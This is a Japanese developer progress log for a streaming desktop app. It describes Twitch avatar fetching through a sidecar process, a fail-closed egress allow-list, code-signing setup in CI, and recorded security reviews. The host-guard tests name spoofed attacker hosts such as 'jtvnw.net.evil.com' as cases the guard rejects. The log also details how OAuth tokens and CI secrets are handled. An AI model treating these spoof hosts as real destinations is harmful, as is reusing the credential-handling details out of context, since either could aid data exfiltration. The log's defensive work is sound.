  `getSelfUserId` は不変。
- **解決戦略＝「キャッシュ+await」（ユーザー承認）**: `comment.repository.ts` の `streamComments` で、chat イベントごとに
  `chatter_user_id` を **Helix で解決してから mapper へ渡す**。解決結果は **id→URL キャッシュ（Layer A・`Map<string,string|null>`・
  件数上限500・挿入順で最古 eviction・メモリ内・非永続）** に載せ、**キャッシュ済み投稿者は Helix を叩かない**（各投稿者最大1回＝過剰呼び出し
  防止）。Helix が throw した一過性失敗は**キャッシュせず次コメントで再試行**（毒キャッシュ回避）＝配信は止めない。mapper（`comment.mapper.ts`）は
  任意第2引数 `resolveAvatar?: (chatterUserId) => string | undefined` を追加し両ブランチ（message/notification）で `author.avatar` を設定
  （YouTube mapper と同じ意味＝URL をドメイン `User.avatar` へ）。
- **036b 基盤の再利用（Twitch 用に新実装しない）**: URL→data URI 変換・縮小相当・上限付きキャッシュ・タイムアウト・バイト上限・MIME 許可・
  失敗時 `undefined`（overlay グレー丸フォールバック）は `resolveAvatarDataUri` をそのまま利用。配信境界 converter（`comment-to-view.converter.ts`）は
  **source 非依存で無変更**（`User.avatar` を埋めるだけで Twitch も自動で data URI 化される）。Twitch は `profile_image_size` 相当の指定が無く
  Helix の実寸 URL を使うため、想定外サイズは 036b 基盤のバイト上限（128KB）で sidecar 内遮断。
- **追加 egress を allow-list 明示追加（host-guard.ts）**: `ALLOWED_HTTPS_WILDCARD_SUFFIXES` に **`.jtvnw.net`** を追加（Twitch アバター CDN・
  例 `static-cdn.jtvnw.net`）。**HTTPS の fetch でのみ許可**し **WS/gRPC には広げない**（gRPC は `www.googleapis.com:443` のみのまま）。先頭ドット
  suffix で真のサブドメインのみ一致し `jtvnw.net.evil.com`/`evil-jtvnw.net` は throw。global `fetch` はパッチ済みのため Helix `/users` も画像 fetch も
  自動でガードを通る（新規 fetch ラッパ不要）。env ピン留め・gRPC チャネルガードは不変。
  - `scripts/test-host-guard.mjs` に `.jtvnw.net` 用ケース（許可＝`static-cdn.jtvnw.net`／拒否＝偽装2種・非https・WS・gRPC）を追加。
    **全 38 ケース PASS**（`node apps/comment-sidecar/scripts/test-host-guard.mjs`＝`HOST-GUARD PASS`）。
- **docs/security.md 更新（host-guard.ts・test と一致）**: §1 に **「追補（036c・Twitch 分）」** を追加（`*.jtvnw.net` を HTTPS fetch allow へ明示追加・
  Helix `users` 照会は既存宛先内・sidecar 内完結・data URI/URL/Helix 応答/トークン非保存）。「コメントビューア方針」⑩末尾の 036c プレースホルダを
  **実施済み記述**へ更新。§10 に「036c＝新規依存なし（036b 基盤＋既存 Helix client＋標準 `Map` の再利用のみ）」を併記。
- **security-review 結果＝問題なし（修正必須なし）**。観点確認: `*.jtvnw.net` が allow-list に明示追加され外・非https・WS/gRPC は throw（test 固定・
  `redirect:"error"` でリダイレクト迂回も遮断）／Helix `users` は既存宛先内・id→URL キャッシュで各投稿者最大1回＝過剰呼び出しなし／036b 基盤を
  再利用（Twitch 用に新実装なし）／画像取得・Helix 照会が sidecar 内に閉じ webview/CSP/capabilities/Rust no-internet 不変／id→URL キャッシュは
  メモリ内・上限500・非永続で data URI/URL/Helix 応答/トークンを DB・ログに出さない（§9）／host-guard.ts・test・security.md の一致／新規依存なし。
  `id` は `URLSearchParams` でエンコード（投稿者 ID は Twitch 由来・自由入力でない）。後回し改善＝レイド時の解決直列化（将来ウィンドウ・バッチ化の余地・
  キャッシュで総呼び出しは抑制済み・非対象）。
- **検証結果**: `pnpm --filter ./apps/comment-sidecar typecheck`＝0 error／`build:tsc`＝OK。`node apps/comment-sidecar/scripts/test-host-guard.mjs`
  ＝HOST-GUARD PASS（38/38）。`pnpm --filter ./apps/desktop typecheck`＝0／`lint`＝0。`git diff --stat`＝**7 ファイル**（sidecar TS 4＋host-guard/test 2＋
  docs 1）で、**package.json（依存）・capabilities・tauri.conf.json・Rust は不変**。
  ※`pnpm --filter ./apps/comment-sidecar lint` は sidecar に lint script が無く実行不可（036a/036b と同様・品質ゲートは typecheck＋host-guard test）。
- **未確認（ユーザー環境・実機）**: `pnpm --filter ./apps/desktop tauri dev` で Twitch 実配信（実 OAuth）につなぎ、overlay に実アイコン表示／
  取得失敗時グレー丸フォールバック／Helix `users` のバッチ照会・同一投稿者の重複抑制（sidecar ログ）を目視。あわせて `lsof -i` で外部
  ESTABLISHED ソケットが sidecar PID 下のみに出ること（本体 PID に出ない）を確認。
- **【036c 追修正】Twitch アイコンがグレー丸になる不具合の解消（画像サイズ）**: 実機確認で、アイコン設定済みチャンネルでもグレー丸に
  フォールバックする事象を確認。原因＝**Twitch の Helix `profile_image_url` は既定で 300×300 を返す**（サイズ指定パラメータ無し）一方、036b 基盤の
  バイト上限は **YouTube の 48px（数 KB）前提の 128KB**。実測で写真系アバターの 300×300 は shroud=101KB・pokimane=121KB と**上限に肉薄/超過**し、
  `resolveAvatarDataUri` が `undefined`→グレー丸（かつ負キャッシュ5分で継続）。MIME/リダイレクト/ホストガードは無罪（実測で `image/png`・
  リダイレクト0・200 直応答）。**対策＝YouTube の `profile_image_size=48` と同様に CDN 側で縮小**: `helix.client.ts` に `toSmallTwitchAvatarUrl` を
  追加し、URL 内の `-profile_image-<W>x<H>` を **`-profile_image-70x70`** に差し替えて返す（`getUserProfileImagesByIds` の結果格納時に適用・
  パターン不一致 URL はそのまま＝安全側）。70×70 は 1〜11KB で上限を余裕でクリア＋WS ペイロードも軽量化。**宛先は同じ `static-cdn.jtvnw.net`
  （`.jtvnw.net` allow-list 内）・HTTPS fetch のままで新規 egress なし＝host-guard/security.md は変更不要**。`typecheck`=0・sidecar 再ビルド
  （SEA 署名 OK・freshness OK）。実機での実アイコン表示は再確認予定。
- **036 系（036a〜c）完了**。overlay 投稿者アイコンは YouTube（036b・コメントストリームの `profile_image_url`）／Twitch（036c・Helix `users` 解決
  ＋70×70 縮小）ともに sidecar が data URI 化して表示、失敗時はグレー丸フォールバック。egress は fail-closed ホストガードの allow-list（`*.ggpht.com`/
  `*.googleusercontent.com`/`*.jtvnw.net`・HTTPS fetch 限定）に閉じ、data URI/URL/トークンは DB・ログ非保存。

## 2026-07-21 (099a Windows コード署名 + sidecar 先行ビルド（既存 release.yml 再利用）)

親 099 フェーズ2。**配布/署名/CI 設定のみ**でアプリ本体コード・実行時依存・`csp:null` は不変。2 部（依存関係あり）で、
まず **(I) comment-sidecar を CI で先行ビルド**して comment-viewer 入り配布を緑化できる土台を作り、その上に
**(II) Windows コード署名（Azure Trusted Signing）**を載せた。新規 workflow は作らず既存 `.github/workflows/release.yml` に配線。

### 承認済みの決定（着手前に確定）
- **macOS universal sidecar = 1ランナー+Rosetta**（macos-latest 1台で `build:sea` を2回。x64 は Rosetta node で作って rename → native arm64）。
  universal 維持・`build-sea.mjs`/`check-fresh.mjs` **無改変**・変更は release.yml のみ。
- **署名ツール = `artifact-signing-cli`**（現行 Tauri v2 公式が採用。タスク記載 `trusted-signing-cli` の後継/改名。公式ドキュメント/リポジトリで確認）。
  account/profile を env（`AZURE_ARTIFACT_SIGNING_ACCOUNT`/`_CERTIFICATE_PROFILE`）で渡せるためラッパー不要。
- **endpoint は tauri.conf.json に直書き（非機密リージョン URL・`<REGION>` プレースホルダ）／ account・profile・auth は env（Secrets 由来）**。

### (I) sidecar 先行ビルド（release.yml）
- `Install dependencies` の後・`Build installers`（tauri-action）の前に、プラットフォーム別 sidecar ビルドを追加。焼き込み env は
  `TWITCH_CLIENT_ID`/`YOUTUBE_CLIENT_ID`/`YOUTUBE_CLIENT_SECRET`（Secrets 由来・GitHub 自動マスク・build-sea は値を echo しない）。
- **Windows(x64)**: `build:sea` 1 本＝`comment-sidecar-x86_64-pc-windows-msvc.exe`。
- **macOS(両 arch)**: ①`softwareupdate --install-rosetta`（冪等な保険）②setup-node `architecture: x64`→`pnpm install`（`@esbuild/darwin-x64`
  materialize）→`build:sea`→出力（名は aarch64 だが中身 x64）を **`comment-sidecar-x86_64-apple-darwin` に `mv`** ③setup-node `arm64`→
  `pnpm install`→`build:sea`＝`comment-sidecar-aarch64-apple-darwin`。2 本揃い、`check:sidecar`（host=aarch64）通過、tauri が lipo で universal 化。
  **注**: esbuild が arch 一致ネイティブバイナリを要求するため、node arch 切替ごとに `pnpm install` が要る（本方式唯一の煩雑点。CI で不安定なら
  Option B＝macos-13 Intel でネイティブ x64 sidecar→artifact がフォールバック）。

### (II) Windows コード署名（Azure Trusted Signing / artifact-signing-cli）
- **tauri.conf.json に `bundle.windows` を新設**（既存 `app.windows`＝窓設定とは別）: `signCommand`
  `artifact-signing-cli -e https://<REGION>.codesigning.azure.net -d StreamDock %1` ＋ `timestampUrl: http://timestamp.acs.microsoft.com`
  ＋ `digestAlgorithm: "sha256"`。`targets:"all"` のため **NSIS `.exe` と WiX `.msi` の両方**が署名対象。account/profile/auth は env 由来なので
  signCommand に `-a`/`-c`/認証を書かない。timestampUrl/digestAlgorithm は certificateThumbprint 無し＝Tauri 内蔵署名は不発で実質 inert
  （CLI が SHA256＋Azure TS タイムスタンプを付与）だが、完了条件が 3 キーの存在を要求するため記載。
- **release.yml の windows-latest レグにのみ配線**: `cargo install artifact-signing-cli --locked`（CI 限定・**アプリ実行時依存に入れない**・Rust は既存 setup 済み）
  ＋ `Build installers` step の env に Azure 認証/識別子を**三項式で windows 限定**注入（`AZURE_TENANT_ID`/`AZURE_CLIENT_ID`/`AZURE_CLIENT_SECRET`/
  `AZURE_ARTIFACT_SIGNING_ACCOUNT`←`AZURE_TS_ACCOUNT`/`AZURE_ARTIFACT_SIGNING_CERTIFICATE_PROFILE`←`AZURE_TS_PROFILE`）。**macOS 署名は不変**（Azure env を渡さない）。

### 追加 GitHub Secrets（2 系統・すべて Secrets のみ・リポジトリに置かない）
- sidecar 焼き込み: `TWITCH_CLIENT_ID` / `YOUTUBE_CLIENT_ID` / `YOUTUBE_CLIENT_SECRET`
- Azure 署名: `AZURE_TENANT_ID` / `AZURE_CLIENT_ID` / `AZURE_CLIENT_SECRET` / `AZURE_TS_ACCOUNT` / `AZURE_TS_PROFILE`
  （endpoint は非機密のため Secret 化せず tauri.conf.json の `<REGION>` を置換）。既存 `RELEASE_REPO_TOKEN` 踏襲。README にどの Secret に何を入れるか明記。

### README 更新
- 「署名について（現状）」→「署名について」に更新: **Windows = Azure Trusted Signing 署名済み（フェーズ2 完了）**、macOS = 未署名（右クリック→開くで回避）。
  追加 Secrets 2 系統の設定手順と endpoint 置換手順を追記（値は載せない）。

### security-review 結果＝問題なし（修正必須なし）
- 観点確認: 配布/署名/CI のみでアプリ挙動・Tauri command・capability・`csp:null` 不変／外部通信・telemetry をアプリに追加せず（signCommand/timestampUrl は
  CI ビルド時のみ実行）／新規ツールは CI 上の `cargo install` に閉じ `Cargo.toml`/`package.json` の実行時依存に入れない（§10）／秘匿値は全ファイルで
  ハードコードなし・`secrets.*` 由来 env のみで GitHub 自動マスク・build-sea は値を echo しない（§9）／Azure 認証情報は三項式で windows 限定・macOS へ渡さない／
  endpoint は非機密プレースホルダ／OAuth 焼き込みは既存設計（方針⑥⑧・PKCE）どおりで生成物には入るがソース/ログには出さない。
- 後回し改善: `artifact-signing-cli` の**トップ版 pin**（`--locked` は依存ツリー固定でトップ版は非固定。CI 緑化後に `--version <x.y.z>` 推奨）／
  signtool 未検出時は Windows SDK bin を PATH 追加（release.yml にコメント済み）。

### 検証結果（実装後・こちらで実施）
- `apps/desktop/src-tauri/tauri.conf.json`＝valid JSON ✓／`.github/workflows/release.yml`＝valid YAML ✓。
- `pnpm --filter ./apps/desktop typecheck`＝0 error／`cd apps/desktop/src-tauri && cargo check`＝Finished（アプリ無変更の退行なし）。
- `git diff --stat`＝**3 ファイル**（`.github/workflows/release.yml` / `apps/desktop/src-tauri/tauri.conf.json` / `README.md`）＋本節。
  **不変**: build-sea.mjs / check-fresh.mjs / アプリ本体コード / Cargo.toml / package.json 実行時依存 / `csp:null`。**新規ファイルなし**。

### 未確認（ユーザー環境・Secrets 設定後）
- CI: テストタグ push（例 `git tag v0.0.2-sign-test && git push --tags`）or workflow_dispatch → Actions 緑 → ①両 OS で `build:sea` 成功し
  comment-viewer 入りインストーラ生成（Windows は sidecar `.exe` 同梱・macOS は両 arch lipo）②tauri-action ログで `signCommand` 実行し
  Windows `.exe`/`.msi` 両署名 ③ログに鍵/トークン非出力。
- Windows 実機: `signtool verify /pa /v StreamDock_x64-setup.exe`（`.msi` も）通過・デジタル署名に発行者表示・SmartScreen「不明な発行元」解消・
  コメビュ（Twitch/YouTube 連携）動作＝焼き込み ID 非空。
- **既知リスク（要ウォッチ）**: externalBin sidecar の署名（tauri #11778）／tauri-action×署名 CLI 版差でサイン未実行の回帰（#13991）→ CI ログで signCommand 実行を確認。
- コミット分割推奨: (I) を先に緑化 →(II)。commit/push は本人の明示指示があるまで未実行。

### 【方針変更 2026-07-21】(II) の署名方式を Azure Trusted Signing → SSL.com IV + eSigner に変更

- **理由**: Azure Trusted Signing（現 Artifact Signing）の公開信頼証明書は **日本在住の個人開発者は対象外**
  （公式ドキュメント 2026-05 更新: 公開信頼＝米国・カナダの個人／米国・カナダ・EU・英国の組織のみ。本人確認の
  国選択に日本が出ない。Private Trust は SmartScreen を解決しないため不可）。加えて Artifact Signing は
  無料/試用サブスクリプション非対応。ユーザー（日本の個人）では取得不可のため断念。
- **代替の選定**: 日本の個人で取得でき、GitHub Actions で自動署名でき、確実・turnkey な **SSL.com の個人検証(IV)
  コード署名証明書 + eSigner クラウド署名**を採用（30 日無料トライアルで CI を先に検証可能）。比較検討: Certum 個人
  （最安級だがクローズドソース個人可否とヘッドレス CI が要確認）、Sectigo/Comodo IV + Cloud KMS + jsign（維持費最安だが
  DIY 度大）。SmartScreen は IV/OV のため**評判蓄積型**（配布直後は警告残・実績蓄積で発行者名表示。即時は EV のみ・法人要）。
- **実装の作り直し**:
  - `apps/desktop/src-tauri/tauri.conf.json`: Azure 用 `bundle.windows`（signCommand/timestampUrl/digestAlgorithm）を**撤去し元に戻した**。
    署名は tauri ではなく CI の後段で行う（Tauri signCommand は不使用）。
  - `.github/workflows/release.yml`: `artifact-signing-cli` 導入と Azure env を撤去し、**tauri ビルド後に `sslcom/esigner-codesign`
    で NSIS `.exe` / WiX `.msi` を署名**（`command: sign` + `override: true` でその場置換）。windows-latest レグのみ・macOS 不変。
    署名対象は最終インストーラ2本（sidecar/アプリ本体 exe は未署名のまま＝SmartScreen はインストーラ署名で解消）。
  - 追加 Secrets（Azure 系を廃し SSL.com 系へ）: `ES_USERNAME` / `ES_PASSWORD` / `CREDENTIAL_ID` / `ES_TOTP_SECRET`。
    sidecar 焼き込み Secrets（`TWITCH_CLIENT_ID`/`YOUTUBE_CLIENT_ID`/`YOUTUBE_CLIENT_SECRET`）は不変。
  - README「署名について」を SSL.com IV + eSigner に更新（Azure 非対象の経緯も明記）。
- **セキュリティ注意（後回し改善）**: `sslcom/esigner-codesign@develop` は署名資格情報（ES_PASSWORD/ES_TOTP_SECRET/CREDENTIAL_ID）を
  受け取るサードパーティ Action。供給網対策として **@develop ではなくレビュー済みコミット SHA / リリースタグに固定**することを推奨。
- **未確認（ユーザー実施）**: SSL.com IV 購入→本人確認(3〜5日)→`CREDENTIAL_ID`/`ES_TOTP_SECRET` 取得→Secrets 登録→
  30 日トライアル中にテストタグ push で CI 署名を検証→Windows 実機 `signtool verify /pa /v` で発行者表示・SmartScreen 確認。
  署名対象ファイルパス解決（bundle/nsis・msi）は初回 CI で要目視（必要なら微調整）。

### 【追加 2026-07-21】署名を Secrets 有無で条件実行（未署名 MVP を先行配布可能に）

- ユーザー要望「証明書取得前でも MVP を配布したい」に対応。`build` ジョブに `env: HAS_WINDOWS_SIGNING: ${{ secrets.ES_USERNAME != '' }}`
  を追加し、Windows 署名 3 ステップ（Locate / Sign .exe / Sign .msi）の `if` に `&& env.HAS_WINDOWS_SIGNING == 'true'` を付与。
- 効果: **SSL.com Secrets 未設定なら署名ステップを自動スキップ**し未署名でビルド＝CI 緑・comment-viewer 入り MVP を即配布可能。
  証明書発行後に Secrets を登録した瞬間から**コード変更なしで自動署名に切替**。README「署名について」も条件実行に合わせて更新。
- 注意（不変）: comment-viewer を含めるビルド自体には焼き込み Secrets（`TWITCH_CLIENT_ID`/`YOUTUBE_CLIENT_ID`/`YOUTUBE_CLIENT_SECRET`）が
  必須（build-sea が fail-fast）。未署名配布でもこの 3 件は要設定。SSL.com 本人確認(Verified ID)はユーザー都合の時に完了させればよい（MVP 配布を阻害しない）。

### 【CI 修正 2026-07-22】macOS universal ビルド失敗（sidecar universal 化）を修正

- 初回 CI（未署名 MVP）で macos-latest が失敗。エラー＝`failed to bundle project: Failed to copy external binaries: resource path
  binaries/comment-sidecar-universal-apple-darwin doesn't exist`。**原因**: tauri は `--target universal-apple-darwin` では
  externalBin を **per-arch 2 本ではなく単一の universal（fat）バイナリ `comment-sidecar-universal-apple-darwin`** として要求する
  （当初「2 本を別々に置けばよい」と誤解していた）。Rust ビルドは通り、bundle 段階で universal 版が無く失敗していた。
- **修正**: aarch64 ビルド後に **lipo で x86_64＋aarch64 を結合し `comment-sidecar-universal-apple-darwin` を生成**、`codesign --force --sign -`
  で ad-hoc 署名し直すステップを追加。aarch64 単体は **check:sidecar（host=aarch64 を検査）用に残す**。upload-artifact の dmg グロブは
  `target/**/release/bundle/...` で universal 出力（`target/universal-apple-darwin/...`）を拾えるため変更不要。release.yml YAML 検証 ✓。
- 学び: universal の externalBin は「両 arch を作って lipo で 1 本」が正解。per-arch を並べる方式は不可。

## 2026-07-23 セキュリティレビュー実施記録（docs/security.md から移設）

docs/security.md は「セキュリティレビューの観点・方針・レビュー必須条件」のみを記載するファイルとし、
個別変更のレビュー実施記録は本ファイル（progress.md）に記録する方針に変更した（2026-07-23・security.md
冒頭「このファイルの役割」参照）。以下は security.md に蓄積されていた実施記録節の移設で、内容は移設時点の
まま無編集。文中の「上記/下記/§n/方針⑧」等は移設元 docs/security.md 内の節・条項を指す。今後のレビュー
実施記録もここに追記する。

### 098 Windows Build（Windows 前面化 / focus_process / windows クレート / 028 unsafe FFI の実検証・security-review 実施済み）

- Windows 11 ARM64（UTM/QEMU）実機で、これまで未コンパイル・未検証だった Windows 限定コードを **初コンパイル・初 E2E** した:
  前面化（`process/service.rs::mod windows`：`focus_by_pid`/`EnumWindows`/`SetForegroundWindow`/`AttachThreadInput`/
  `CreateToolhelp32Snapshot`）、`focus_process` コマンド、028 アイコン抽出（`tools/icon.rs::mod windows` の unsafe FFI）。
  `cargo check`/`clippy` は **コード修正ゼロで通過**（GDI/COM の型も windows 0.58 で問題なし）。
- **前面化 / focus_process / windows クレート・028 unsafe FFI の security-review を実施し、判定＝問題なし**（修正必須なし）。
  これにより、これまで「未実施」だった前面化まわりの security-review（011/021 の Windows 経路注記・progress.md 既知 TODO）を**解消**する。
  確認事項:
  - `focus_process` は frontend から **launchId のみ**受け取り raw PID / HWND を受けない。前面化対象は **registry 保持の
    自分が起動した PID とその子孫プロセス**に限定し、**プロセス名では他人のウィンドウを探さない**（§6/§2）。
  - registry に無い launchId は前面化せず **新規インスタンスを起動しない**（二重起動を根絶）。
  - ウィンドウ選定は `GetWindowTextLengthW` の**長さ判定のみ**で**タイトル文字列を読まない**。エラーは固定文言・
    フルパス/OS エラー非露出・追加ログなし（§9）。shell 非経由・外部通信/ファイル書込削除なし（§1/§4/§5）。
  - ハンドル/COM 解放: 前面化は `CloseHandle(snapshot)` 実施。028 は RAII ガード（`CoUninitialize`/`DestroyIcon`/
    `DeleteObject`/`ReleaseDC`）が全 early-return・`?` 経路で解放し、COM インターフェース Release → `CoUninitialize` の
    drop 順も正しい。実機の繰り返し登録で不安定化なし＝リーク兆候なしと整合。
  - 追加依存は `windows` クレートの **feature のみ**（新規 crate なし・§10）。`csp:null` 不変・外部リソース非増加（§CSP）。
- **既知の限界（記録のみ・修正不要）**: `collect_process_tree` は PID 再利用時に無関係な PID を子孫集合に含めうる
  （深さ 8 / 件数 1024 で保護）。ただし操作は**前面化のみ（kill しない）**で実害は「無関係なウィンドウが前面に出る」程度・
  低頻度。停止経路（§6）のような exe/start_time 照合の追加は前面化の低リスクに対し過剰なため据え置く。
- **アプリアイコン（icon.ico）**: 098 で Windows 用 `icon.ico` を再生成した（読み取り専用の静的アセット変更のみ・
  OS 操作/通信/権限に影響なし）。macOS の `icon.icns` は不変。`tauri.conf.json` / capabilities は変更なし。

### 032c-c コメントビューア VOICEVOX ローカル合成読み上げ（loopback 50021 例外の（再）定義・security-review 実施済み）

- 032c 方針転換の中核（内蔵コメントビューア × VOICEVOX 直接読み上げ）を実装した。viewer webview から**ローカルの
  VOICEVOX ENGINE**（`http://127.0.0.1:50021`・ループバック）へ `fetch` で GET `/version`（稼働検出）／POST
  `/audio_query`／POST `/synthesis`（合成）を投げ、返る WAV を **Web Audio** でローカル再生する（FIFO 直列 TTS キュー）。
  032c-a で全撤去した loopback 例外を、合成＋ローカル再生に限定して**§1 に（再）定義**した（上記「例外（032c-c…）」）。
- **security-review を実施し、判定＝問題なし**（修正必須なし）。確認事項:
  - **通信はループバック 50021 のみ**: 宛先は `127.0.0.1:50021` に限定（GET /version・POST /audio_query・POST
    /synthesis）。**インターネット通信・Node sidecar・OAuth には一切波及しない**（Twitch/YouTube 取得は 032c-b/-d）。
    合成対象はコメント本文のみ・URL/絵文字を除去してから送る・**著者名は送らない**。text は `encodeURIComponent`／
    `JSON.stringify` で安全に送出。返る WAV は外部送信せずローカル再生のみ。クレジット文中の URL は静的表示で fetch しない。
  - **新規依存ゼロ**: 合成 HTTP と再生は viewer の `fetch`＋Web Audio（Web 標準 API）で行い、Rust に HTTP クライアント・
    音声再生ライブラリ（`reqwest`/`rodio` 等）を追加しない（`Cargo.toml`/`package.json` 不変）。
  - **プロセス起動は管理付き spawn のみ**: ENGINE 起動は薄い新 command `launch_voicevox_engine`（frontend 引数ゼロ）が
    `resolve_tool_for_component`（**登録済みツールを exe 名一致で解決**・Executable 限定・OS 別 `VOICEVOX.app`/
    `VOICEVOX.exe`）→ `process::service::spawn`（`validate_executable`・shell 非経由）＋PID registry 登録
    （`launch_tool` と同経路）で行う。frontend は raw パス/ポートを渡さず**絶対パス直起動しない**・未登録なら誘導のみ
    （`registry()` は空のまま）。§6「停止は自 spawn 起動 PID に限定」と整合。
  - **capability / CSP 不変**: アプリ定義 command は本構成の capability permission に列挙不要のため
    `capabilities/comment-viewer.json`（`core:default`）に per-command 許可を追加していない（viewer からの invoke 可否は
    E2E で確認）。`capabilities/default.json`（main）・`tauri.conf.json`（`csp: null`）に差分なし。CSP 硬化はしない。
  - **binding drift ゼロ**: 新 command は既存 `LaunchResult` を再利用し新規 ts-rs 型ゼロ（`gen:bindings` で 032c-c 由来の
    差分ゼロ）。
- **docs 整理**: §1 に 032c-c の loopback 50021 例外を（再）定義し、らくらく方針節（032c-a 撤去注記）の stale pointer
  「VOICEVOX 直接読み上げの通信方針は 032c-b で定義」を「032c-c で（再）定義した」に修正。新例外は 50021 のみを列挙する
  （棒読み 50001 は撤去済みとして含めない）。

### 032c-b コメントビューア Twitch コメント取得＋Node sidecar 初解禁（StreamDock 初の能動的インターネット通信・security-review 実施済み）

- StreamDock で初めての能動的インターネット通信を、**Twitch allow-list 宛先・ユーザー明示接続時のみ・Node sidecar 封じ込め**
  で初解禁した。osareview の Twitch 経路を distill（vendor）した単一実行ファイル sidecar（`bundle.externalBin`）を **Rust の
  `app.shell().sidecar()` から**起動/停止し、viewer は localhost WS で受信描画する（Device Code ログイン＋EventSub/Helix・TTS 無し）。
- **security-review を実施し、判定＝問題なし**（修正必須なし）。確認事項:
  - **allow-list 二層強制（fail-closed）**: ①env ピン留め（全 base URL を sidecar 内定数に固定・env override 分岐削除・
    Rust から宛先 env を渡さない）②ホストガード（global `fetch` と ws クライアント生成を包み、`{id.twitch.tv, api.twitch.tv,
    eventsub.wss.twitch.tv, *.wss.twitch.tv}` 以外・非 HTTPS/WSS を throw）。ユニットテストで `evil.com`・スキーム不一致・
    サブドメイン偽装（`api.twitch.tv.evil.com`）を全拒否、reconnect `*.wss.twitch.tv` のみ許可を確認。全 fetch/ws 経路
    （Device Code / Helix / EventSub の初回＋reconnect）がガードを通ることを grep で確認。
  - **封じ込め**: インターネットは sidecar プロセスのみ・**main とその Rust command は no-internet 維持**。**Rust は完全同期**
    （tokio/reqwest/websocket crate を足さない・sidecar stdout は別スレッドで `blocking_recv`）。`tauri-plugin-shell` は追加したが
    **capability に `shell:*` ゼロ付与**（IPC 非経由・frontend に shell 面/raw パス/ポートを出さない）。`get_comment_stream_port` は
    読み取り専用・引数なし。no-orphan の 3 段 kill（窓 Destroyed/CloseRequested・RunEvent::Exit 新設・sidecar ppid 監視 self-exit）。
  - **資格情報（§9）**: OAuth アクセス/リフレッシュトークン・device code・code verifier は **in-memory・非ログ・非外部送信**
    （keyring 永続化しない）。診断は stderr（stdout はポート受け渡し専用）。`user_code`/`verification_uri`（非機密）はテキスト提示、
    `open` 廃止。**取得コメントは画面表示のみ**で端末外へ出さず DB/ログにも保存しない。
  - **依存**: `@grpc/grpc-js`/`@grpc/proto-loader`（YouTube 除外）・`@napi-rs/keyring`（in-memory 化）・`open`・`hono`/
    `@hono/node-server`/`zod`・`dotenv` を落とし、bundle・binary の exact 検査で不在を確認。telemetry/analytics 系なし。
  - **capability / CSP 不変**: `capabilities/default.json`（main）・`comment-viewer.json`（`core:default`）・`tauri.conf.json` の
    `csp: null` に差分なし（`bundle.externalBin` 追加のみ）。**binding drift ゼロ**（`check:bindings` に `comment-viewer/bindings` を追加）。
  - **Twitch アプリ Client ID** は Device Code（public client・secret 無し）の**公開**識別子で、sidecar のビルド時に焼き込む
    （ランタイム env/dotenv 不使用・エンドユーザーに露出しない）。ユーザーのログイン/連携はビューア画面からのランタイム操作。
- **後回し（記録のみ）**: loopback WS は未認証で、同一 PC の任意プロセスが制御フレーム送信・`comments.append`/`user_code` 受信し得る
  （token/device_code は WS に流さない・宛先 allow-list 限定のため実害は公開コメント＋非機密 `user_code` の露出に留まる。032c-c の
  ループバックと同レベル）。将来 nonce ハンドシェイクを検討。**実機の封じ込め確認（`lsof` で外部ソケットが sidecar PID 下のみ・
  main no-internet）と実 Twitch E2E は mac GUI（`tauri dev`）で実施**（`TWITCH_CLIENT_ID` 設定後）。
- **docs 整理**: §1 に「例外（032c-b…）」を追加＋032c-c 例外の forward-ref（「Twitch/YouTube は 032c-b/-d で定義」）を
  「Twitch は 032c-b で定義済み・YouTube は 032c-d」に更新。§4（sidecar 例外）・§9（トークン取扱）・§10/Capabilities（tauri-plugin-shell
  権限ゼロ＋externalBin・落とした依存）・レビュー必須条件（本連携）を追記。新章「## コメントビューア（配信サービス連携）方針」を追加。
  `docs/product.md`「MVP でやらないこと」に外部通信の例外を追記。
- **追補（032c-b′・ログイン永続化＝§9 ポリシー変更・⚠ 再 security-review 必要）**: 上記レビュー後、実利用の UX 改善として
  Twitch ログインを **OS キーチェーンに永続化**する変更を追加した（窓の再オープン／アプリ再起動でも再ログイン不要）。これは §9 の
  「in-memory のみ・keyring 永続化しない」を改める**ポリシー変更**なので、**マージ前に security-review を再実施すること**。設計前提:
  - **keychain 所有は Rust 側**（`keyring` crate v3・同期）。sidecar は pure-JS/単一 SEA のまま（native keyring を持ち込まない＝
    封じ込めライフサイクルと SEA 構成・spike-2 禁止依存アサートは不変）。トークンは **sidecar↔Rust の親子 private pipe のみ**を通る
    ＝復元＝Rust→sidecar stdin `COMMENT_SIDECAR_RESTORE=<json>`、更新の再保存＝sidecar→Rust stdout `COMMENT_SIDECAR_TOKEN=<json>`／
    破棄＝`COMMENT_SIDECAR_TOKEN_CLEAR`。Rust はその内容を**ログに出さず keychain のみへ反映**。**loopback WS にはトークンを載せない**
    （従来どおり・device code(秘密) も非送出）。
  - 封じ込め・§1（ユーザー明示接続時のみ通信）・§4（shell 権限ゼロ）・CSP・capability・sidecar 窓ライフサイクルは**不変**
    （token 復元はネットワークを張らず、取得は従来どおり「コメント取得開始」で明示開始）。改訂は §9/§10 のみ（keychain 保存＋private
    pipe を許容・Rust `keyring` 追加）。viewer は `link.state` フレームで「接続済み/未接続」を表示（getLinkStatus・非機密の bool のみ）。
  - **マージ前 GUI 検証（追加）**: 再ログイン不要（窓再オープン／アプリ再起動）・logout/失効で keychain クリア・`lsof`/`app_logs`/
    stdout/stderr に token が出ない（token は private pipe のみ）・macOS Keychain に `stream-dock`/`twitch-comment-viewer` エントリ 1 件。

### 032c-d コメントビューア YouTube コメント取得有効化（OAuth PKCE＋Client Secret 同梱＋gRPC streamList＋クォータ管理・security-review 実施済み）

- 032c-b の Node sidecar 封じ込め基盤の上に **YouTube 宛先を追加解禁**した（新しい通信基盤は作らない）。OAuth 認可コード＋PKCE(S256)＋
  loopback＋Client Secret 同梱でログイン→gRPC `liveChatMessages.streamList` で取得→既存 CommentViewDto パスへ流す。Twitch と併存・各サービス
  個別選択（**当時。035a で同時取得・マージ表示を解禁**＝上記「## コメントビューア（配信サービス連携）方針」を参照）。設計は `docs/tasks/032c-d-youtube-comments.md`。
- **security-review を実施し、判定＝問題なし**（修正必須なし）。確認事項:
  - **allow-list 三面 fail-closed**: (a) env ピン留め＝OAuth endpoint／Data API base URL を sidecar 内定数に固定（`Pinned*ConfigProvider`・
    env override 排除）、(b) fetch ホストガード＝global `fetch` に `oauth2.googleapis.com`（token 交換）／`www.googleapis.com`（REST 検出）を
    追加（`accounts.google.com` はブラウザ側で fetch には入れない）、(c) **gRPC チャネルガード新設**＝gRPC は `fetch`/`ws` を通らないため、
    channel 生成時に target を `www.googleapis.com:443` のみに照合して throw（fetch より狭い allow-list）。ユニットテスト
